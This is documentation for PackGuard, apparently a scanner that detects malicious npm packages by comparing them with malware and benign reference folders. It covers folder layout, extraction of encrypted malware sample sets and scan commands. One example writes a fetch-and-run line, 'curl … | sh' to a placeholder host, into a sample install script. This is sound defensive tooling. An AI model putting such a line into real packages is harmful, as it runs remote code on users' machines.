# Folder layout: references, benign references and packages to scan

PackGuard reads three kinds of folder:

| Kind | Passed as | Required |
|---|---|---|
| Malware reference set | first positional argument, `<reference_dir>` | yes |
| Benign reference set | `-B <benign_dir>` | only for the benign veto (`--mode known`) |
| Packages to scan | every later positional argument, `<package_path>...` | at least one |

The scanner loads the reference sets once and then scans each package path in turn. None of
these folders is created by the build; all three are made by the user (or by the scripts that
build a dataset). This page describes exactly what the scanner expects to find inside them.

## Rules shared by all three folders

Every path given to the scanner is walked recursively. `node_modules` is skipped at every
depth. What each entry becomes depends on its name:

| Entry | How it is read |
|---|---|
| `*.js`, `*.cjs`, `*.mjs` | JavaScript: chunked and scored by NCD, at any depth |
| `install_scripts.txt` | Install-script text (one chunk), at any depth |
| `package.json` | Only when it is the path itself or directly inside it. Its `preinstall`, `install` and `postinstall` commands are scored as the install-script chunk. Deeper `package.json` files are ignored, because npm never runs their scripts. |
| `node_modules/` | Skipped, including everything below it |
| Any other file | Ignored when found by walking. Scored as `other` only when it is passed directly as a package path. |

Files are read as bytes and never executed. A file that is not valid UTF-8 is still scored;
its report `text` shows invalid bytes as U+FFFD.

Reference paths also define the identities used in reports:

- **Group** = the first path component below the reference directory.
- **Package** = the second path component, when the file sits at least two folders below the
  reference directory; otherwise the group key.

So a reference set needs **one folder per package**, and each package's files must sit
directly inside that folder. In the malware set the package folder is the second level; in
the flat benign set it is the first level. `match.file` in a report is the path relative to
the reference directory, and `matched_packages[].package` / `matched_packages[].group` are
the two keys above. `-k` ranks groups by their lowest NCD.

> Never extract malware on Windows. Antivirus quarantines the files and long paths exceed
> 260 characters. Do all malware work inside WSL (or a VM).

## Malware reference folder (`<reference_dir>`)

The shipped v1 and v2 sets both use `<group>/<package>@<version>/<file>`, where the group is
a 12-hex-digit code-shape id and nested package paths are flattened with `__`:

```
malware_refs/                          <- <reference_dir>
├── 00032d39ec3e/                      <- group (code shape)
│   └── ect-987654@0.0.1/              <- package (name@version)
│       ├── index.js
│       ├── _admin.js
│       ├── admin.js
│       └── lib__auth.js               <- lib/auth.js, flattened
├── 000ccab6c135/
│   └── request-param-validator@1.0.1/
│       ├── index.js
│       └── lib__getProxyFromURI.js
└── a018c9a99f7b/
    └── cooler-loans-api-get@1337.1.0/
        └── install_scripts.txt        <- install scripts, never package.json
```

Requirements and conventions:

- **Group folder.** Any label works; it is the `group` in reports and the unit ranked by
  `-k`. One folder per code shape in v1/v2.
- **Package folder.** One folder per name and version, named `<name>@<version>` so the
  report can split it into package name and version. Put different versions in separate
  sibling folders; never nest them.
- **Files.** `.js`, `.cjs`, `.mjs`, and `install_scripts.txt`. Reference sets deliberately
  keep no `package.json`; the scanner reads the scripts text directly from
  `install_scripts.txt`.
- **No archives.** `.zip` files are not opened; they are ignored by the walk.
- Flattening nested paths with `__` is the convention of the shipped sets, not a scanner
  requirement: files may be in real subfolders below the package folder, because the package
  key is still the second component. Flattening keeps paths short and is what the builders
  do.

### Create it from the shipped encrypted zips (WSL)

```bash
# inside WSL, from a checkout at /mnt/c/.../PackGuard
mkdir -p ~/packguard-data/v1/malware_js
for z in data/v1/malware_js_*.zip; do
    unzip -q -P infected "$z" -d ~/packguard-data/v1/malware_js
done

# sanity checks
find ~/packguard-data/v1/malware_js -mindepth 2 -maxdepth 2 -type d | wc -l   # 5,904
find ~/packguard-data/v1/malware_js -type f -name '*.js' | wc -l              # 39,119
```

Extract **all 16 zips into the same parent directory**; the zips split the set by the first
hex character of the code-shape folder, and the group names do not collide. The reference
directory is that parent (`~/packguard-data/v1/malware_js`), not one zip's contents and not
an individual package folder.

For v2 use `data/v2/malware_js_*.zip` and a separate directory such as
`~/packguard-data/v2/malware_js`. Do not mix v1 and v2: v2 packages may carry
`install_scripts.txt`, and its shapes were built with a different rule.

### Create a minimal custom reference set

```bash
mkdir -p refs/group-a/evil-pkg@1.0.0
cp samples/evil-pkg/index.js refs/group-a/evil-pkg@1.0.0/index.js
printf '%s\n' 'curl -s https://example.invalid/x | sh' \
    > refs/group-a/evil-pkg@1.0.0/install_scripts.txt

build/packguard -j 4 refs scan/foo@1.0.0
```

The first positional argument is the reference directory; every later path is a package to
scan.

## Benign reference folder (`-B`)

The benign set is a second reference directory with the same file rules, but it is **flat**:
one folder per package directly below the directory, with no group level.

```
benign_refs/                           <- -B <benign_dir>
├── express@4.18.2/
│   ├── index.js
│   └── lib__router__index.js          <- lib/router/index.js, flattened
├── mime-db@1.52.0/
│   └── index.js
└── zod@3.23.8/
    └── index.js
```

Why flat matters: with no group folder, the first component is both the group and the
package name, so **files must sit directly inside `name@version/`**. If you keep real
subfolders there, the first file's package key becomes the subfolder name and the benign
references are grouped wrongly. Flatten with `__` as shown, which is what
`experiments/v6/scripts/build_benign.py` does.

Other points:

- Pass the directory with `-B`. It is never merged with the malware references: every chunk
  is scored against both sets, and a JavaScript or normalised chunk is flagged only when it
  is close enough to malware **and** closer to malware than to benign code by the margin.
- The same directory is loaded twice in `--mode known`: once raw and once normalised.
- Boilerplate chunks are kept in the benign set even with `-b 1`.

### Create it from the npm corpus (WSL)

```bash
python3 -I experiments/v6/scripts/fetch_benign_corpus.py   # raw tarballs -> ~/packguard-data/raw/npm
python3 -I experiments/v6/scripts/build_benign.py          # -> ~/packguard-data/v6/benign_refs
```

The second script sets aside validation packages, drops repeated files and caps each package
at 128 KiB. Its defaults also write a manifest at
`~/packguard-data/v6/benign_refs_manifest.json`; a copy is kept in
`experiments/v6/results/`.

To add a single benign package by hand, unpack the npm tarball and flatten it:

```bash
mkdir -p benign_refs/left-pad@1.3.0
tar -xzf left-pad-1.3.0.tgz --strip-components=1 -C benign_refs/left-pad@1.3.0
find benign_refs/left-pad@1.3.0 -name node_modules -prune -exec rm -rf {} +
```

Any file that stays in a subfolder must be moved directly into the package folder, with `/`
replaced by `__`.

## Packages to scan (`<package_path>...`)

Each positional path after the reference directory is one package. It can be a package
directory in its normal npm form; it does not need the reference layout.

```
scan/
├── pkg-a@1.0.0/                <- folder name sets report package/version
│   ├── package.json            <- only pre/install/postinstall commands are read
│   ├── index.js
│   └── lib/util.js             <- real subfolders are fine
└── pkg-b/
    └── index.js                <- version empty in the report
```

How it is read:

- All `.js`, `.cjs`, `.mjs` files below the path, except under `node_modules`.
- The `package.json` at the package root (and one level inside it): only its `preinstall`,
  `install` and `postinstall` commands, reported as the `package.json` install-script chunk.
- `install_scripts.txt` anywhere below the path, reported as install-script text.
- `README`, `LICENSE`, `.ts`, `.json` data files and similar are ignored by the walk. Only a
  file passed **directly** as a package path is scored as `kind: "other"`.
- The report's `package` and `version` come from the last path component: a folder named
  `name@version` is split at the last `@`; without one the whole name is used and `version`
  is empty.
- `-d <report_dir>` writes `report_dir/<last path component>.json`, so two packages with the
  same folder name overwrite each other. Use distinct folder names.
- Scanning one package folder produces one report for it. Passing a parent folder (for
  example a whole group or a reference set) produces one report for that parent, not one per
  package inside, so pass each package folder separately or use a glob.

### Create scan folders

```bash
# unpack one npm tarball; never run npm install on a sample
mkdir -p scan/pkg-a@1.0.0
tar -xzf pkg-a-1.0.0.tgz --strip-components=1 -C scan/pkg-a@1.0.0

# scan several packages in one run: references are loaded once
mkdir -p reports
build/packguard --mode known -B "$HOME/packguard-data/v6/benign_refs" \
    -j 4 -d reports "$HOME/packguard-data/v1/malware_js" scan/*
```

The generated transformation scripts write targets in a similar shape, for example
`experiments/v4/scripts/mangle.py` writes `~/pg-v4/targets/<tier>/<category>/<name>@<version>`
and keeps symlinks to the packages to scan in `~/pg-v4/scan/`. The v6 runner scans those
symlinks:

```bash
PACKGUARD=build/packguard experiments/v6/scripts/run_v6.sh r3 -j 4 --mode known \
    -B ~/packguard-data/v6/benign_refs
```

## Container scan

The Docker image mounts the three kinds of folder read-only and with no network:

```bash
docker build -t packguard .
docker run --rm --network none \
    -v "$PWD/refs:/refs:ro" \
    -v "$PWD/benign_refs:/benign:ro" \
    -v "$PWD/samples:/work:ro" \
    packguard --mode known -B /benign /refs /work/pkg-a@1.0.0
```

## Checks before a scan

1. Count package folders, for example
   `find <reference_dir> -mindepth 2 -maxdepth 2 -type d | wc -l` (malware) or
   `find <benign_dir> -mindepth 1 -maxdepth 1 -type d | wc -l` (benign).
2. Make sure no `package.json` is in a reference set; install scripts belong in
   `install_scripts.txt`.
3. Make sure the benign set is flat: `find <benign_dir> -mindepth 2 -type d` must be empty
   apart from `node_modules` folders you should have removed.
4. Run once on a known-benign package and read the load line, which reports the number of
   files, distinct chunks and packages the scanner actually loaded. A package count of 0
   almost always means the reference path is one level too high or too low.

`dataset_index.md` records where the shipped sets live, how they were filtered and what is
still missing.
